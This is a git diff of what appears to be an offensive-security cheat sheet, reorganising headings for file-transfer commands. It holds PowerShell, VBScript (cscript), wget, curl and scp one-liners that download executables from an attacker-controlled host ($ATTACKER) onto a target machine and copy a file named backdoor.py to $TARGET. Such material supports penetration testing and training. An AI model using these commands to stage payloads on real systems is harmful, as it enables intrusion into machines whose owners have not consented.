@@ -153,19 +153,19 @@ echo bye>>ftp-commands.txt
 ftp -s:ftp-commands.txt
 ```
 
-###### HTTP
+###### HTTP: Poweshell
 ```PowerShell
 powershell.exe -Command "& {(New-Object Net.WebClient).DownloadFile('http://$ATTACKER/file.exe', 'C:\file.exe')}"
 powershell.exe -Command "& {Invoke-WebRequest 'http://$ATTACKER/file.exe' -OutFile 'C:\file.exe'}"
 ```
-
-Copy and paste contents of [wget-cscript](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/wget-cscript)
+###### HTTP: VBScript
+Copy and paste contents of [wget-cscript](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/wget-cscript) into a Windows Shell and then:
 ```
 cscript wget-cscript http://$ATTACKER/file.exe localfile.exe
 ```
 
+###### HTTP: Linux
 ```bash
-# Linux
 wget http://$ATTACKER/file
 curl http://$ATTACKER/file
 scp ~/file/file.bin user@$TARGET:tmp/backdoor.py
